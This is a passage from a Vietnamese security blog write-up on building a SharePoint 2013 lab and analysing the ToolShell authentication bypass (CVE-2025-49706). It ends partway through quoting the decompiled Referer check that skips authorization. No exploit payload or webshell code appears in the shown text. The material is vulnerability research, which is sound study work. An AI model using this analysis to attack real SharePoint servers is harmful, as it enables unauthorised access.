@@ -1,0 +1,434 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Tiếp nối từ series trước, trong lúc mình thực hiện thực nghiệm cho đồ án, mình đã nghĩ đến việc là làm 2 cái lab đơn giản để trigger memshell thôi. Nhưng giảng viên hướng dẫn của mình bảo là &ldquo;Làm Sharepoint đi em&rdquo;. So yeah, here we are 🗿\nI. Setup Guidelines Một số link Setup mẫu mình đã tham khảo:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cấu hình máy ảo: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server và promote thành Domain Controller. 2 máy sau sẽ join domain và set DNS là IP của máy DC. Tạo OU ServiceAccounts và thêm 3 account:\n"><title>ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized</title><link rel=canonical href=https://kev1n1203.github.io/p/sharepoint-2013/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized"><meta property='og:description' content="Tiếp nối từ series trước, trong lúc mình thực hiện thực nghiệm cho đồ án, mình đã nghĩ đến việc là làm 2 cái lab đơn giản để trigger memshell thôi. Nhưng giảng viên hướng dẫn của mình bảo là &ldquo;Làm Sharepoint đi em&rdquo;. So yeah, here we are 🗿\nI. Setup Guidelines Một số link Setup mẫu mình đã tham khảo:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cấu hình máy ảo: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server và promote thành Domain Controller. 2 máy sau sẽ join domain và set DNS là IP của máy DC. Tạo OU ServiceAccounts và thêm 3 account:\n"><meta property='og:url' content='https://kev1n1203.github.io/p/sharepoint-2013/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='dotNet'><meta property='article:published_time' content='2026-01-20T00:00:00+00:00'><meta property='article:modified_time' content='2026-01-20T00:00:00+00:00'><meta name=twitter:title content="ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized"><meta name=twitter:description content="Tiếp nối từ series trước, trong lúc mình thực hiện thực nghiệm cho đồ án, mình đã nghĩ đến việc là làm 2 cái lab đơn giản để trigger memshell thôi. Nhưng giảng viên hướng dẫn của mình bảo là &ldquo;Làm Sharepoint đi em&rdquo;. So yeah, here we are 🗿\nI. Setup Guidelines Một số link Setup mẫu mình đã tham khảo:\nhttps://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d https://hackmd.io/@taidh/ByE7_Kqlh Cấu hình máy ảo: DC: WinServer 2012 - 2x2 cores - 4GB RAM SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM DC Set up DNS Server và promote thành Domain Controller. 2 máy sau sẽ join domain và set DNS là IP của máy DC. Tạo OU ServiceAccounts và thêm 3 account:\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#i-setup-guidelines>I. Setup Guidelines</a><ol><li><a href=#cấu-hình-máy-ảo>Cấu hình máy ảo:</a></li><li><a href=#dc>DC</a></li><li><a href=#sql-server>SQL Server</a></li><li><a href=#sharepoint-server>Sharepoint Server</a><ol><li><a href=#lỗi-set-role-iis>Lỗi set role IIS</a></li><li><a href=#lỗi-khi-download-các-package>Lỗi khi download các package</a></li></ol></li></ol></li><li><a href=#ii-toolshell-in-sharepoint>II. ToolShell in Sharepoint</a><ol><li><a href=#cve-2025-49706-bypass-authentication>[CVE-2025-49706] Bypass Authentication</a></li><li><a href=#cve-2024-38018-webpart-properties-insecure-deserialize>[CVE-2024-38018] WebPart Properties Insecure Deserialize</a></li></ol></li><li><a href=#iii-deploy-memory-webshell>III. Deploy Memory Webshell</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/sharepoint-2013/>ToolShell on Microsoft Sharepoint 2013 and Memshell Weaponized</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-01-20T00:00:00Z>Jan 20, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><p>Tiếp nối từ series trước, trong lúc mình thực hiện thực nghiệm cho đồ án, mình đã nghĩ đến việc là làm 2 cái lab đơn giản để trigger memshell thôi. Nhưng giảng viên hướng dẫn của mình bảo là &ldquo;Làm Sharepoint đi em&rdquo;. So yeah, here we are 🗿</p><h2 id=i-setup-guidelines>I. Setup Guidelines</h2><p>Một số link Setup mẫu mình đã tham khảo:</p><ul><li><a class=link href=https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d target=_blank rel=noopener>https://gist.github.com/testanull/e1573437f91ec3726ab5041389c6f28d</a></li><li><a class=link href=https://hackmd.io/@taidh/ByE7_Kqlh target=_blank rel=noopener>https://hackmd.io/@taidh/ByE7_Kqlh</a></li></ul><h3 id=cấu-hình-máy-ảo>Cấu hình máy ảo:</h3><ul><li>DC: WinServer 2012 - 2x2 cores - 4GB RAM</li><li>SQL Server 2012: WinServer 2012 - 2x2 cores - 4GB RAM</li><li>Microsoft Sharepoint Server 2013: WinServer 2012 - 2x2 cores - 16GB RAM</li></ul><h3 id=dc>DC</h3><p>Set up DNS Server và promote thành Domain Controller. 2 máy sau sẽ join domain và set DNS là IP của máy DC.<br><img src=https://hackmd.io/_uploads/SJNrQMhole.png loading=lazy alt=image><br>Tạo OU ServiceAccounts và thêm 3 account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>First name: SharePoint
+</span></span><span class=line><span class=cl>Last name: FarmAdmin
+</span></span><span class=line><span class=cl>User logon name: sp_farmadmin
+</span></span><span class=line><span class=cl>Bỏ chọn “User must change password at next logon”
+</span></span><span class=line><span class=cl>Chọn “Password never expires”
+</span></span><span class=line><span class=cl>Tương tự cho sp_service và sql_service
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sp_service
+</span></span><span class=line><span class=cl>First name: SharePoint
+</span></span><span class=line><span class=cl>Last name: Service
+</span></span><span class=line><span class=cl>Username: sp_service
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sql_service
+</span></span><span class=line><span class=cl>First name: SQL
+</span></span><span class=line><span class=cl>Last name: Service
+</span></span><span class=line><span class=cl>Username: sql_service
+</span></span></code></pre></td></tr></table></div></div><h3 id=sql-server>SQL Server</h3><p>Join Domain và set DNS.
+Tải SQL Server Express bản Advanced để cài luôn cả thể Management Studio. Link tải: <a class=link href="https://www.microsoft.com/en-us/download/details.aspx?id=43351" target=_blank rel=noopener>https://www.microsoft.com/en-us/download/details.aspx?id=43351</a><br>Tại đây chọn SQLEXPRADV_x64_ENU.exe và cài đặt như bình thường.<br>Lưu ý: Để không bị lỗi <code>The SQL Server service account login or password is not valid. Use SQL Server Configuration Manager to update the service account.</code> khi set người dùng DC\sql_service cho SQL Server Database Engine thì sử dụng WinServer 2012 để set up, dùng Win10 sẽ bị lỗi (mình không hiểu vì sao).<br>Còn lại config theo hướng dẫn của anh Jang và a TàiDH</p><h3 id=sharepoint-server>Sharepoint Server</h3><p>Join Domain và set DNS.<br>Link download file img sharepoint: <a class=link href=https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013 target=_blank rel=noopener>https://www.microsoft.com/en-us/evalcenter/download-sharepoint-server-2013</a> => Chọn bản English<br>WinServer 2012 dính rất nhiều lỗi khi set up SharePoint Server 2013:</p><h4 id=lỗi-set-role-iis>Lỗi set role IIS</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>There</span> <span class=n>was</span> <span class=n>an</span> <span class=n>error</span> <span class=n>during</span> <span class=n>Installation</span><span class=p>,</span> <span class=n>The</span> <span class=k>tool</span> <span class=n>was</span> <span class=n>unable</span> <span class=n>to</span> <span class=n>install</span> <span class=n>Application</span> <span class=n>Server</span> <span class=n>Role</span><span class=p>,</span> <span class=n>Web</span> <span class=n>Server</span> <span class=p>(</span><span class=n>IIS</span><span class=p>)</span> <span class=n>Role</span>
+</span></span></code></pre></td></tr></table></div></div><p>Link tham khảo nếu gặp:<br><a class=link href=https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html target=_blank rel=noopener>https://www.sharepointdiary.com/2015/05/there-was-an-error-during-installation-the-tool-was-unable-to-install-application-server-role-web-server-iis-role.html</a><br><a class=link href=https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/ target=_blank rel=noopener>https://vladtalkstech.com/microsoft-365/sharepoint/the-tool-was-unable-to-install-web-server-iis-role-sharepoint-2016-on-windows-server-2016/</a></p><ul><li>Tự cài đặt các feature bằng Powershell:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Add-WindowsFeature NET-WCF-HTTP-Activation45,NET-WCF-TCP-Activation45,NET-WCF-Pipe-Activation45
+</span></span><span class=line><span class=cl>Add-WindowsFeature Net-Framework-Features,Web-Server,Web-WebServer,Web-Common-Http,Web-Static-Content,Web-Default-Doc,Web-Dir-Browsing,Web-Http-Errors,Web-App-Dev,Web-Asp-Net,Web-Net-Ext,Web-ISAPI-Ext,Web-ISAPI-Filter,Web-Health,Web-Http-Logging,Web-Log-Libraries,Web-Request-Monitor,Web-Http-Tracing,Web-Security,Web-Basic-Auth,Web-Windows-Auth,Web-Filtering,Web-Digest-Auth,Web-Performance,Web-Stat-Compression,Web-Dyn-Compression,Web-Mgmt-Tools,Web-Mgmt-Console,Web-Mgmt-Compat,Web-Metabase,Application-Server,AS-Web-Support,AS-TCP-Port-Sharing,AS-WAS-Support, AS-HTTP-Activation,AS-TCP-Activation,AS-Named-Pipes,AS-Net-Framework,WAS,WAS-Process-Model,WAS-NET-Environment,WAS-Config-APIs,Web-Lgcy-Scripting,Windows-Identity-Foundation,Server-Media-Foundation,Xps-Viewer
+</span></span></code></pre></td></tr></table></div></div><ul><li>Copy file <code>C:\Windows\System32\ServerManager.exe</code> ngay tại folder System32 và đổi tên thành <code>ServerManagerCMD.exe</code></li><li>Nếu vẫn không được, xem log tại <code>%TEMP%</code> => prerequisiteinstaller.{thời gian cài đặt}.log để đọc log sẽ thấy command run update role như sau:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;C:\Windows\system32\ServerManagerCmd.exe&#34; -inputpath &#34;C:\Users\SP_FAR~1\AppData\Local\Temp\PreFEB1.tmp.XML&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#34;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe&#34; -i
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#34;C:\Windows\system32\cscript.exe&#34; &#34;C:\Windows\system32\iisext.vbs&#34; /enext &#34;ASP.NET v4.0.30319&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&#34;C:\Windows\system32\iisreset.exe&#34; /noforce
+</span></span></code></pre></td></tr></table></div></div><p>Có thể tự chạy xong rồi restart máy cài tiếp (biện pháp cuối cùng)<br>Lưu ý: Không tắt ServerManager khi đang install. Nếu như install thấy lâu chứng tỏ đang chết tại bước set Role này, nó đang đợi kết quả trả về</p><h4 id=lỗi-khi-download-các-package>Lỗi khi download các package</h4><p>Khi download các package như SQL Server Native Client và các package sau sẽ liên tục dính lỗi vì WinServer 2012 đã cũ và không thực hiện kết nối được site go.microsoft.com (WinServer 2012 có vấn đề gì đấy với TLS1.2)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=p>[</span><span class=n>In</span> <span class=n>HRESULT</span> <span class=n>format</span><span class=p>]</span> <span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Beginning</span> <span class=n>download</span> <span class=n>of</span> <span class=n>Microsoft</span> <span class=n>Sync</span> <span class=n>Framework</span> <span class=n>Runtime</span> <span class=n>v1</span><span class=o>.</span><span class=mi>0</span> <span class=n>SP1</span> <span class=p>(</span><span class=n>x64</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>go</span><span class=o>.</span><span class=n>microsoft</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>fwlink</span><span class=o>/</span><span class=err>?</span><span class=n>LinkID</span><span class=o>=</span><span class=mi>224449</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Error</span><span class=p>:</span> <span class=n>InternetOpenUrl</span> <span class=n>failed</span> <span class=p>(</span><span class=mh>0X80072F07</span><span class=o>=-</span><span class=mi>2147012857</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>go</span><span class=o>.</span><span class=n>microsoft</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>fwlink</span><span class=o>/</span><span class=err>?</span><span class=n>LinkID</span><span class=o>=</span><span class=mi>224449</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Error</span><span class=p>:</span> <span class=n>Download</span> <span class=n>failed</span> <span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>19</span> <span class=mi>07</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span> <span class=o>-</span> <span class=n>Last</span> <span class=k>return</span> <span class=n>code</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Đến đoạn này thì khi gặp lỗi ở đâu mình sẽ copy link download fail tại file log và tải ở ngoài, sau đó tự cài các package vào.<br>Đây là các package mình đã tải:<br><img src=https://hackmd.io/_uploads/HJvyZG3ogl.png loading=lazy alt=image><br>Các file msi thì có thể chạy ngay, sau đó restart máy cài tiếp.
+Còn một số file exe nên chạy command, cài đặt giao diện xong Sharepoint vẫn sẽ báo là download error (không hiểu kiểu gì):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>WindowsServerAppFabricSetup_x64.exe /i CacheClient,CachingService,CacheAdmin /gac
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>WcfDataServices.exe /quiet /norestart
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>AppFabric1.1-KB2671763-x64-ENU.exe /quiet /norestart
+</span></span></code></pre></td></tr></table></div></div><p>Sau khi cài đặt sau đều nên restart rồi bật lên cài tiếp, cho đến khi hiện quá trình cài đặt hoàn tất thì tiếp tục chạy setup.exe và làm theo các bước set up Sharepoint:<br><img src=https://hackmd.io/_uploads/H1bdZzhjxl.png loading=lazy alt=image><br>Cấu hình Sharepoint theo mặc định. Tại bước Database server nhập ip của máy SQL Server là 10.10.1.137 và người dùng kết nối là sp_service. Sau khi cấu hình xong, truy cập tới đường dẫn http://sp-server:16504/ để xác nhận đã cấu hình Central Admin thành công:<br><img src=https://hackmd.io/_uploads/rkGND9yB-g.png loading=lazy alt=image><br>Tiếp tục tạo site test collection:<br><img src=https://hackmd.io/_uploads/Skme_qJrbx.png loading=lazy alt=image><br></p><h2 id=ii-toolshell-in-sharepoint>II. ToolShell in Sharepoint</h2><p>Do lần đầu vọc Sharepoint, mình đã đi tìm một CVE có poc sẵn để thực hiện khai thác, sau đó mình chọn bug ToolShell vì nó có ảnh hưởng đến tất cả version của Sharepoint 2013. Bug này trigger chỉ bằng 1 request, gồm 2 bước: Bypass Authen và Deserialize to RCE.<br>Để tiến hành debug và đọc source của Sharepoint thì mình sử dụng Dnspy, chọn Attach to Process và trỏ đúng tiến trình IIS w3wp.exe đang chạy Collection Site của Sharepoint tại port 80:<br><img src=https://hackmd.io/_uploads/Hydk_5kBWe.png loading=lazy alt=image><br>Mở tab Modules để xem các file dll đang được tiến trình load, từ đó có được dll đang được Sharepoint load:<br><img src=https://hackmd.io/_uploads/rJUruqyHZx.png loading=lazy alt=image><br></p><h3 id=cve-2025-49706-bypass-authentication>[CVE-2025-49706] Bypass Authentication</h3><p>CVE-2025-49706 xảy ra tại class SPRequestModule thuộc namespace Microsoft.SharePoint.ApplicationRuntime. Đây là một class implements IHttpModule, sử dụng để chứa các EventHandler trong request pipeline của IIS.<br>Tại đây, method PostAuthenticateRequestHandler được sử dụng để xử lý xác thực các HTTP request đến trong Sharepoint, chính vì vậy nó được gọi chỉ sau event BeginRequest:<br><img src=https://hackmd.io/_uploads/rJ53O51HWe.png loading=lazy alt=image><br>Bên trong hàm tồn tại đoạn code xử lý truy cập các file css js đối với người dùng không xác thực như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>if (!context.User.Identity.IsAuthenticated){
+</span></span><span class=line><span class=cl>    if (flag4){
+</span></span><span class=line><span class=cl>       if (this.RequestPathIndex == SPRequestModule.PathIndex._layouts){
+</span></span><span class=line><span class=cl>          Uri uri3 = null;
+</span></span><span class=line><span class=cl>          try{
+</span></span><span class=line><span class=cl>             uri3 = context.Request.UrlReferrer;
+</span></span><span class=line><span class=cl>          }
+</span></span><span class=line><span class=cl>          catch (UriFormatException){}
+</span></span><span class=line><span class=cl>          if (uri3 != null){
+</span></span><span class=line><span class=cl>             string absolutePath = uri3.AbsolutePath;
+</span></span><span class=line><span class=cl>             if (SPRequestModule.s_LoginUrl == null){
+</span></span><span class=line><span class=cl>                ULS.SendTraceTag(2470943U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Unexpected, &#34;LoginUrl is unset for request to &#39;{0}&#39;.&#34;, new object[] { SPAlternateUrl.ContextUri });
+</span></span><span class=line><span class=cl>             }
+</span></span><span class=line><span class=cl>             else if (absolutePath.EndsWith(SPRequestModule.s_LoginUrl, StringComparison.OrdinalIgnoreCase) &amp;&amp; (text2.EndsWith(&#34;.css&#34;, StringComparison.OrdinalIgnoreCase) || text2.EndsWith(&#34;.js&#34;, StringComparison.OrdinalIgnoreCase))){
+</span></span><span class=line><span class=cl>                context.SkipAuthorization = true;
+</span></span><span class=line><span class=cl>             }
+</span></span><span class=line><span class=cl>          }
+</span></span><span class=line><span class=cl>       }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    else if (!flag6 &amp;&amp; settingsForContext != null &amp;&amp; settingsForContext.UseClaimsAuthentication &amp;&amp; !settingsForContext.AllowAnonymous){
+</span></span><span class=line><span class=cl>       ...
+</span></span><span class=line><span class=cl>       SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    else if (flag5){
+</span></span><span class=line><span class=cl>       ...
